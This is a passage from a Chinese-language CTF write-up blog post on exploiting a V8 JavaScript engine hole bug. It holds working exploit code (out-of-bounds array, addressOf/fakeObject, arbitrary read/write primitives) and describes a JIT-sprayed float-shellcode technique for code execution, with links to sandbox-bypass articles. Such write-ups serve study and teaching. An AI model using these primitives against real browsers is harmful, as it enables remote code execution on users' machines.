</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> oob_arr;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> oob_arr <span style=color:#666>=</span> GetOobArr(hole);
</span></span><span style=display:flex><span>  oob_arr[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xDEADBEEF</span>n);
</span></span><span style=display:flex><span>  oob_arr[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> i2f(<span style=color:#40a070>0xDEADBEEE</span>n);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> float_arr <span style=color:#666>=</span> [<span style=color:#40a070>1.1</span>, <span style=color:#40a070>1.2</span>, <span style=color:#40a070>1.3</span>, <span style=color:#40a070>1.4</span>];
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> float_arr2 <span style=color:#666>=</span> [<span style=color:#40a070>2.1</span>, <span style=color:#40a070>2.2</span>, <span style=color:#40a070>2.3</span>, <span style=color:#40a070>2.4</span>];
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> int_arr <span style=color:#666>=</span> [<span style=color:#40a070>1</span>, <span style=color:#40a070>2</span>, <span style=color:#40a070>3</span>, <span style=color:#40a070>4</span>];
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> object_arr <span style=color:#666>=</span> [{}, {}, {}, {}];
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> leak_object_arr <span style=color:#666>=</span> [<span style=color:#40a070>2.1</span>, <span style=color:#40a070>2.2</span>, <span style=color:#40a070>2.3</span>, <span style=color:#40a070>2.4</span>];
</span></span><span style=display:flex><span>  console.log(<span style=color:#4070a0>&#34;++++++++++++++++++++++++++++++++++++++&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(float_arr);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  console.log(<span style=color:#4070a0>&#34;++++++++++++++++++++++++++++++++++++++&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(object_arr);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  console.log(<span style=color:#4070a0>&#34;++++++++++++++++++++++++++++++++++++++&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(leak_object_arr);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  oob_arr[<span style=color:#40a070>13</span>] <span style=color:#666>=</span> i2f((f2i(oob_arr[<span style=color:#40a070>13</span>]) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF</span>n) <span style=color:#666>|</span> <span style=color:#40a070>0x0000200000000000</span>n);
</span></span><span style=display:flex><span>  oob_arr[<span style=color:#40a070>41</span>] <span style=color:#666>=</span> i2f((f2i(oob_arr[<span style=color:#40a070>41</span>]) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF</span>n) <span style=color:#666>|</span> <span style=color:#40a070>0x0000200000000000</span>n);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  console.log(float_arr.length)
</span></span><span style=display:flex><span>  console.log(object_arr.length);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> float_map <span style=color:#666>=</span> f2i(float_arr[<span style=color:#40a070>11</span>]) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xffffffff</span>n;
</span></span><span style=display:flex><span>  console.log(<span style=color:#4070a0>&#34;PACKED_DOUBLE_ELEMENTS map: 0x&#34;</span> <span style=color:#666>+</span> float_map.toString(<span style=color:#40a070>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> object_map <span style=color:#666>=</span> f2i(float_arr[<span style=color:#40a070>32</span>]) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xffffffff</span>n;
</span></span><span style=display:flex><span>  console.log(<span style=color:#4070a0>&#34;PACKED_DOUBLE_ELEMENTS map: 0x&#34;</span> <span style=color:#666>+</span> object_map.toString(<span style=color:#40a070>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> addressOf <span style=color:#666>=</span> (obj) =&gt; {
</span></span><span style=display:flex><span>    object_arr[<span style=color:#40a070>38</span>] <span style=color:#666>=</span> obj;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> f2i(leak_object_arr[<span style=color:#40a070>0</span>]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> fakeObject <span style=color:#666>=</span> (addr) =&gt; {
</span></span><span style=display:flex><span>    float_arr[<span style=color:#40a070>0x10</span>] <span style=color:#666>=</span> i2f(addr);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> object_arr[<span style=color:#40a070>0</span>];
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> rw_tool <span style=color:#666>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// map
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    i2f(float_map),
</span></span><span style=display:flex><span>    i2f(<span style=color:#40a070>0x00000008BEEFDEAD</span>n),
</span></span><span style=display:flex><span>    <span style=color:#40a070>1.1</span>,
</span></span><span style=display:flex><span>    <span style=color:#40a070>1.2</span>
</span></span><span style=display:flex><span>  ];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> rw_tool_addr <span style=color:#666>=</span> addressOf(rw_tool) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF</span>n;
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(rw_tool);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  console.log(<span style=color:#4070a0>&#34;rw_tool addr: 0x&#34;</span> <span style=color:#666>+</span> rw_tool_addr.toString(<span style=color:#40a070>16</span>))
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> arbitary_rw_tool <span style=color:#666>=</span> fakeObject(rw_tool_addr <span style=color:#666>-</span> <span style=color:#40a070>0x20</span>n);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> read64 <span style=color:#666>=</span> (address) =&gt; {
</span></span><span style=display:flex><span>    rw_tool[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> i2f((address <span style=color:#666>|</span> <span style=color:#40a070>0x0000000200000000</span>n) <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>n <span style=color:#666>+</span> <span style=color:#40a070>1</span>n);
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// %DebugPrint(arbitary_rw_tool);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    <span style=color:#007020;font-weight:700>return</span> f2i(arbitary_rw_tool[<span style=color:#40a070>0</span>]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>let</span> write64 <span style=color:#666>=</span> (address, val) =&gt; {
</span></span><span style=display:flex><span>    rw_tool[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> i2f((address <span style=color:#666>|</span> <span style=color:#40a070>0x0000000200000000</span>n) <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>n <span style=color:#666>+</span> <span style=color:#40a070>1</span>n);
</span></span><span style=display:flex><span>    arbitary_rw_tool[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> i2f(val);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// Calculate the address of FLAG_wasm_memory_protection_keys
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// ref: https://securitylab.github.com/research/in_the_wild_chrome_cve_2021_37975/
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// console.log(&#34;wrapper_type_info: 0x&#34; + wrapper_type_info);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(arbitary_rw_tool);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>var</span> wasmCode <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> Uint8Array([<span style=color:#40a070>0</span>, <span style=color:#40a070>97</span>, <span style=color:#40a070>115</span>, <span style=color:#40a070>109</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>133</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>96</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>127</span>, <span style=color:#40a070>3</span>, <span style=color:#40a070>130</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>4</span>, <span style=color:#40a070>132</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>112</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>5</span>, <span style=color:#40a070>131</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>6</span>, <span style=color:#40a070>129</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>7</span>, <span style=color:#40a070>145</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>2</span>, <span style=color:#40a070>6</span>, <span style=color:#40a070>109</span>, <span style=color:#40a070>101</span>, <span style=color:#40a070>109</span>, <span style=color:#40a070>111</span>, <span style=color:#40a070>114</span>, <span style=color:#40a070>121</span>, <span style=color:#40a070>2</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>4</span>, <span style=color:#40a070>109</span>, <span style=color:#40a070>97</span>, <span style=color:#40a070>105</span>, <span style=color:#40a070>110</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>10</span>, <span style=color:#40a070>138</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>132</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>128</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>65</span>, <span style=color:#40a070>42</span>, <span style=color:#40a070>11</span>]);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>var</span> wasmModule <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> WebAssembly.Module(wasmCode);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>var</span> wasmInstance <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>new</span> WebAssembly.Instance(wasmModule, {});
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>var</span> f <span style=color:#666>=</span> wasmInstance.exports.main;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// %DebugPrint(wasmInstance);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  addr_f <span style=color:#666>=</span> addressOf(f) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF</span>n;
</span></span><span style=display:flex><span>  console.log(f());
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>var</span> instance_addr <span style=color:#666>=</span> addressOf(wasmInstance) <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFFFFFF</span>n;
</span></span><span style=display:flex><span>  console.log(<span style=color:#4070a0>&#34;[+] instance_addr: 0x&#34;</span> <span style=color:#666>+</span> instance_addr.toString(<span style=color:#40a070>16</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// w^x protect on, nomore rwx
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// var rwx_addr = read64(instance_addr - 1n + ???n);
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// console.log(&#34;[+] rwx_addr: 0x&#34; + rwx_addr.toString(16));
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>FinalExploit(theHole);
</span></span></code></pre></div><p>由于现在高版本已经启用了 W^X 保护—— wasm function 中不再有 rwx 的内存段，不能直接执行 shellcode getshell。不过这个可以通过<a href=https://tiszka.com/blog/CVE_2021_21225_exploit.html>这篇文章</a>尾部提到的覆写 <code>write_protect_code_memory_</code> 来绕过。这就出现了另一个问题，该字段所处的对象在 ptmalloc 堆上，由于此版本 v8 也开启了指针压缩，我们无法实现对该堆的任意读写，这就需要<a href=https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/#Escape-the-Cage>这篇文章</a>中提到的方法来绕过了。遗憾的是，由于比赛时间不够，我并没有根据两篇文章中的方法实现利用。而且据说，这种方式在高版本中也失效了。</p><h2 id=rce><span class=section-num>4</span> rce</h2><p><del>还是接触的少了，对 v8 的利用只停留在了可以对 wasm 一把梭的年代。希望可以蹲一个大佬的 exp 学习</del> 从 <strong>@nightu</strong> 师傅那里求来了 exp ，发现他的做法是</p><ol><li>直接向 jit 函数中写入 shellcode 片段</li><li>修改 <code>&lt;Funtion></code> 的 <code>CodeDataContainer</code> 中的 <code>code_entry_point</code> ，把该变量指向我们的 shellcode 片段</li><li>执行该函数</li></ol><p>这里我只是没有想到原来现在的 v8 还可以做到直接向 jit 函数中布置 shellcode 片段，但是调试了一下确实是可以做到的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#007020;font-weight:700>const</span> foo <span style=color:#666>=</span> ()=&gt;
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> [
</span></span><span style=display:flex><span>        <span style=color:#40a070>1.0</span>,
</span></span><span style=display:flex><span>                <span style=color:#40a070>1.95538254221075331056310651818</span>E<span style=color:#666>-</span><span style=color:#40a070>246</span>,
</span></span><span style=display:flex><span>                <span style=color:#40a070>1.95606125582421466942709801013</span>E<span style=color:#666>-</span><span style=color:#40a070>246</span>,
</span></span><span style=display:flex><span>                <span style=color:#40a070>1.99957147195425773436923756715</span>E<span style=color:#666>-</span><span style=color:#40a070>246</span>,
</span></span><span style=display:flex><span>                <span style=color:#40a070>1.95337673326740932133292175341</span>E<span style=color:#666>-</span><span style=color:#40a070>246</span>,
</span></span><span style=display:flex><span>                <span style=color:#40a070>2.63486047652296056448306022844</span>E<span style=color:#666>-</span><span style=color:#40a070>284</span>];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (<span style=color:#007020;font-weight:700>let</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> <span style=color:#40a070>0x10000</span>; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>        foo();foo();foo();foo();
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>如上代码在 jit 后，会生成下面的代码片段</p><figure><img src=/ox-hugo/jit-shellcode-demo.png></figure><p>可见对于浮点数组，turbofan 在优化后会把代码生成为 <code>movabs &lt;reg>, &lt;imm></code> 样式，我们只要把 <code>code_entry_point</code> 指向这些片段，就可以执行 shellcode 了。</p><p><em>没有想到这个方法的原因很简单，我以为这个早就被 mitigate 了，因为在很久以前就看到 v8 有针对 jit spraying 的保护，但是没想到对于浮点数组似乎没有效果的样子</em></p><p>另外，交流后获得了一些文章链接，这里整理一下</p><ul><li><a href=https://ju256.de/posts/kitctfctf22-date/>在无法使用上述方法如 jit 禁用时绕过 heap sandbox 的方法</a></li><li><a href=https://anvbis.au/posts/code-execution-in-chromiums-v8-heap-sandbox/>使用 jit function rce（上述方法）</a></li></ul><p>另外比赛完后，顺便去夫子庙旁边逛了逛，路过一条河，看别人都在拍照自己也凑凑热闹拍了一张</p><p><img src=https://cjovi.icu/usr/uploads/2023/03/703390071.png alt=某条河边></p><p>感觉南京这里确实还挺漂亮的，至少灯光颜色挺统一的。可惜没把女朋友带来。</p></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/jchu95495236 rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>